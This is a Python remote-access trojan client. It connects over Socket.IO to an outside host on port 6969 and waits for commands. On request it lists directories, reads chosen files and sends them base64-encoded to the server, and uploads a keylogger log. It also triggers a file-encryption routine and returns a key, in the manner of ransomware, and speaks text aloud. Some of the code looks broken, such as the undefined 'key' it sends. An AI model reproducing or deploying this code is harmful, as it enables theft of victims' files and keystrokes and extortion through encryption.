from socketIO_client import SocketIO, BaseNamespace
from sysPathList import *
import base64
from encryptFS import *
sys.path.insert(0, r'tools/')
import Tracket
from multiprocessing import Process




class ChatNamespace(BaseNamespace):

    def reply(self, *args):
        print('reply', args)

class NewsNamespace(BaseNamespace):

    def on_aaa_response(self, *args):
        print('on_aaa_response', args)




def reply(*args):
    print('reply', args)

def fileDirReturn(data):

	x = lists(data['dir'])
	if(x == ''):
		x = lists('/')
	if(data['file']!= ''):
		filename = data['file']
		
		file = open(data['dir'] + data['file'], 'rb')
		fileread = file.read()
		encode = base64.encodestring(fileread)
		socketIO.emit("fileData", {'file':filename, 'filedata': encode})
	else:
		socketIO.emit("dirData", {'syslist': x})

def keyLogReturn(data):

		
	file = open("python-tools/Tracketlog.txt", 'rb')
	fileread = file.read()
	encode = base64.encodestring(fileread)
	socketIO.emit("keylogData", {'file':"keyloggerLog.txt", 'filedata': encode})

def encryptStuff(data):
	encryptionExecute()
	file = open("pass.txt", 'rb')
	fileread = file.read()
	encode = base64.encodestring(fileread)
	socketIO.emit("encryptData", {'key': key})

def tts(data):
	speak(data['text'])


socketIO = SocketIO('andrewarpasi.com', 6969)

socketIO.emit('registerListener', {'UID': 'testID'}, reply)
socketIO.on("feedback", reply)
socketIO.on('fileReq', fileDirReturn)
socketIO.on('keyLog', keyLogReturn)
socketIO.on('encrypt', encryptStuff)
socketIO.on('tts', tts)

socketIO.wait_for_callbacks(seconds=20)
